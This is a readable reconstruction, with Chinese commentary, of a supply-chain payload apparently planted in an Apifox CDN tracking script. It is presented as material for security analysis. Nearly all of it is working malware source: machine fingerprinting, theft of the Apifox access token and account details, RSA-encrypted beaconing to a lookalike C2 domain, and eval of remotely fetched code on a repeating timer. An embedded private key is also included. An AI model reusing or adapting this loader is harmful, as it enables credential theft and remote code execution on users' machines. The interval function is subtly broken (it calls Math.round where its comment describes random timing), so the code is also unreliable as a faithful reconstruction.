/**
 * ============================================================
 * Apifox CDN 投毒事件 - 恶意载荷还原代码
 * ============================================================
 *
 * 原始文件: apifox-app-event-tracking.min.js
 * 本文件是从混淆代码中还原出的可读版本，仅供安全分析使用。
 *
 * 警告: 请勿执行此代码！这是恶意软件的还原分析。
 * ============================================================
 */

// ============================================================
// 依赖模块 (仅在 Electron/Node.js 环境中可用)
// ============================================================
const nodeCrypto = require('crypto');
const nodeOs = require('os');

// ============================================================
// 常量定义
// ============================================================

// 内嵌的 RSA 私钥 (用于加密外发数据 & 解密远程载荷)
const PRIVATE_KEY = `-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDOPeHTeyrblELD
O/JYR80HQvCZMd6QEOmHNdI9tTQfVNHvU/31MhMymSQMq2cCx5+RbJ1fSQ9/5rkx
5SMMGMRwlxS7JK9t4usj0Ln/cliipYXQJ9ZtyfPL0ovxpMiCOcnbqQuskwifZt8f
lB1fGMQDG9oqxe609o0to5YfYNJ0xdNfb+Snd+cBQiy2ZmFCiD74LjuEneEYeKdn
MnVuglDfDVmpaVUall3YuaBnXx96bkHRUAhrVTYgshcOexENztTpH1uC9OPr8R51
hK+rMRvhRO24nf3UPEIzPQwJb67Ynnql51ygmm3q9VYJkIzalGFaHlInyXoZYAup
btPckKv7AgMBAAECggEAQDUNwBwhPJkMq+FW0lsQHomdg+P9qRZKzbhYyrNGFdb/
QKYCczpytZbtnTAjcr8ZE1ogKFEDjUsULs9qONLhHTg70QNbxjcWA2Fw9nDv3Trw
zNwKKsXrq3HR9ZnafohlKoiXRNPFpHKPVjJzbm60X09lfVl/tkDntOSv0PcAri90
ew5Ehyqh99bEjXMimoeG6mdX7/KLstfu/iikKWaDzI4UQgiVOa4zS5NMuQ7lcRvO
N/9YqfWyGSSxIucza0ueK2n1B5Kis8MJPuBlQ5Z0JhWKJ+nrUBnv4OCC9jLsKa6p
G9OUo8jWmB5cUln7uLY4xF+UvYOyUkza99OdtigBmQKBgQD/o3CSxVZUyDrinjGN
5RbMDHlR0rgY9XJk5oEu7nSk2U3ck/l8k0/cKsBbmYt7kBEztbcpWniOeR7cbYGC
8d2w4FuCJxEODfRMgeJYnDOh/I2V+AcWYWTNaJsm3kEl2ZExxprZOj6GvWkd+gME
DD6nuFAkXhtnEeYCIHV/n0mnLQKBgQDOiI6dIsWsinNNmuOba97q3CuHkoYJ6rE3
kq1bTYrj6Bz0cY9sfnMMoTsZnLWVYsNZHgYy+j9Wc4g1hvXWTKMXbIap2UP7IJQm
yMPTo8DDgD4In8cVGE+FN9aOxcB6tcQctm/HDLQUb6WVdy0YjN1KlQP0Yh9nCFca
QHtJM2GYxwKBgCTrfOGloG9EL8T05eFBWcaEcq0PiskIAcpyw+t8QtpgC++0a07D
k8APaJKSHWPuDZ3zO428ZDbnZT6ejhrURZk6/dxROhRWjZbTF1aG0KovaF9lX9iq
nj1QQ0AczznhLygKL+j5kXgyONE8f10BS7c7Vk+6S6jaG+bouy+AWMnNAoGAQKt/
xHJD5VAA5LbwOBVh2raQJsZZlDdZwGX8RE+WguCGWIBKgZVinvzJTa7FKP6g3oHJ
PSMgvAg3CVO2HKEonEgOLpbqc3LzEOXic52d2VmJkxe8tb1EARnH5DLFn2bU/oyd
mX0/0fpXpeKIS1yoWhcpAtfKr29sHrs8H2KoV7cCgYEAvFv8NsETPNSQQxjDwjX/
Y7UcuN/Hftvy9jv5/FBueoDdeZuQEyJUdFHbm9TePtiV4nItGyB+oblUbz++on+k
iIM6gpindiujbNooUUwAeyqClKcrg2BLASysf923MJszhbIUdp9MrG0WoHFKcWsK
1HPFW7rGjV82Fu3No+rLjlo=
-----END PRIVATE KEY-----`;

// C2 服务器地址 (伪装为 Apifox 相关域名)
const REMOTE_JS_URL = "https://apifox.it.com/public/apifox-event.js";

// Apifox 用户信息 API (合法 API, 被恶意利用)
const APIFOX_USER_API = "https://api.apifox.com/api/v1/user";

// 轮询间隔配置
const INTERVAL_MS = 10800000;         // 3 小时 (未使用)
const MIN_MS = 1800000;               // 30 分钟 (最小轮询间隔)
const MAX_MS = 10800000;              // 3 小时 (最大轮询间隔)

// RSA 加密块大小
const RSA_BLOCK_SIZE = 256;

// localStorage 键名
const LS_HEADERS = "_rl_headers";     // 存储收集到的信息头
const LS_MC = "_rl_mc";              // 存储机器指纹


// ============================================================
// 函数：RSA 加密 (用内嵌私钥加密数据用于外发)
// ============================================================
function rsaEncrypt(plaintext) {
    return nodeCrypto.privateEncrypt(
        {
            key: PRIVATE_KEY,
            padding: nodeCrypto.constants.RSA_PKCS1_PADDING
        },
        Buffer.from(plaintext, 'utf8')
    ).toString('base64');
}


// ============================================================
// 函数：RSA 解密 (用内嵌私钥解密从C2获取的远程载荷)
// ============================================================
function rsaDecrypt(encryptedBase64) {
    const encryptedBuffer = Buffer.from(encryptedBase64, 'base64');
    const chunks = [];

    // 按 RSA_BLOCK_SIZE (256 字节) 分块解密
    for (let i = 0; i < encryptedBuffer.length; i += RSA_BLOCK_SIZE) {
        chunks.push(
            nodeCrypto.privateDecrypt(
                {
                    key: PRIVATE_KEY,
                    padding: nodeCrypto.constants.RSA_PKCS1_OAEP_PADDING,
                    oaepHash: 'sha256'
                },
                encryptedBuffer.slice(i, i + RSA_BLOCK_SIZE)
            )
        );
    }

    return Buffer.concat(chunks).toString('utf8');
}


// ============================================================
// 函数：生成机器指纹并收集系统信息
// ============================================================
function getBaseHeaders() {
    // 1. 检查 localStorage 中是否已有缓存的信息
    const cached = localStorage.getItem(LS_HEADERS);
    if (cached) {
        try { return JSON.parse(cached); } catch {}
    }

    // 2. 生成机器唯一指纹 (如果尚未生成)
    let machineId = localStorage.getItem(LS_MC);
    if (!machineId) {
        // 收集硬件/系统信息
        const macAddress = Object.values(nodeOs.networkInterfaces())
            .flat()
            .find(iface => !iface.internal && iface.mac !== '00:00:00:00:00:00')
            ?.mac || '';

        const cpuModel = nodeOs.cpus()[0]?.model || '';
        const hostname = nodeOs.hostname();
        const username = nodeOs.userInfo();        // 注意: 实际调用的是 userInfo().username
        const osType = nodeOs.type();

        // 将所有信息拼接后 SHA-256 哈希作为唯一标识
        const fingerprint = macAddress + '-' + cpuModel + '-' + hostname + '-' + username + '-' + osType;
        machineId = nodeCrypto.createHash('sha256').update(fingerprint).digest('hex');

        localStorage.setItem(LS_MC, machineId);
    }

    // 3. 构建信息头对象
    const headers = {
        'af_uuid': machineId,                                   // 机器指纹 (SHA-256)
        'af_os': nodeOs.type() + ' ' + nodeOs.release(),       // 操作系统信息 (明文)
        'af_user': rsaEncrypt(nodeOs.userInfo().username),      // 系统用户名 (RSA加密)
        'af_name': rsaEncrypt(nodeOs.hostname())                // 主机名 (RSA加密)
    };

    // 4. 缓存到 localStorage
    localStorage.setItem(LS_HEADERS, JSON.stringify(headers));

    return headers;
}


// ============================================================
// 函数：窃取 Apifox 用户信息
// ============================================================
async function getApifoxHeaders() {
    // 1. 从 localStorage 中窃取 Apifox 的登录凭据
    const accessToken = localStorage.getItem('common.accessToken');
    if (!accessToken) return {};

    let token;
    try { token = JSON.parse(accessToken); } catch { token = accessToken; }

    try {
        // 2. 使用窃取的 token 调用 Apifox 官方 API 获取用户信息
        const response = await fetch(APIFOX_USER_API, {
            headers: { 'authorization': token }
        });

        if (!response.ok) return {};

        const data = await response.json();
        if (!data.success || !data.data) return {};

        // 3. 提取用户邮箱和用户名
        const email = data.data.email || '';
        const name = data.data.name || '';

        if (!email && !name) return {};

        // 4. RSA 加密后返回
        return {
            'af_apifox_user': rsaEncrypt(email),    // 用户邮箱 (RSA加密)
            'af_apifox_name': rsaEncrypt(name)      // 用户名 (RSA加密)
        };
    } catch {
        return {};
    }
}


// ============================================================
// 核心函数：获取并执行远程恶意代码
// ============================================================
async function loadAndExecute() {
    try {
        // 1. 收集本机信息
        const headers = getBaseHeaders();

        // 2. 如果还没有 Apifox 用户信息，尝试获取
        if (!headers['af_apifox_user'] || !headers['af_apifox_name']) {
            const apifoxHeaders = await getApifoxHeaders();

            if (apifoxHeaders['af_apifox_user'] && apifoxHeaders['af_apifox_name']) {
                headers['af_apifox_user'] = apifoxHeaders['af_apifox_user'];
                headers['af_apifox_name'] = apifoxHeaders['af_apifox_name'];
                localStorage.setItem(LS_HEADERS, JSON.stringify(headers));
            }
        }

        // 3. 向 C2 服务器发送收集到的信息，获取加密的远程代码
        const response = await fetch(REMOTE_JS_URL, {
            headers: headers
        });

        if (!response.ok) return;

        // 4. 获取 RSA 加密的响应体
        const encryptedCode = (await response.text()).trim();

        // 5. RSA 解密得到明文 JavaScript 代码
        const decryptedCode = rsaDecrypt(encryptedCode);

        // 6. ⚠️ 直接 eval 执行远程代码 - 这是最危险的操作！
        //    攻击者可以通过更新 C2 服务器上的内容来执行任意代码
        eval(decryptedCode);

    } catch (error) {
        // 静默忽略错误，避免暴露
    } finally {
        // 7. 无论成功失败，都安排下一次执行
        scheduleNext();
    }
}


// ============================================================
// 函数：生成随机轮询间隔
// ============================================================
function randomInterval() {
    // 在 30分钟 到 3小时 之间随机选择一个间隔
    return MIN_MS + Math.round() * (MAX_MS - MIN_MS);
    // 即: 1,800,000ms + random * 9,000,000ms
    // 范围: 30分钟 ~ 3小时
}


// ============================================================
// 函数：安排下一次远程代码获取
// ============================================================
function scheduleNext() {
    const interval = randomInterval();
    setTimeout(loadAndExecute, interval);
}


// ============================================================
// 入口：立即执行一次，然后进入定时轮询循环
// ============================================================
void loadAndExecute();
// 执行流程:
// loadAndExecute() → 收集信息 → 发送到C2 → 获取加密代码 → eval执行
//     ↓ (finally)
// scheduleNext() → setTimeout(loadAndExecute, 30分钟~3小时)
//     ↓
// loadAndExecute() → ... (无限循环)
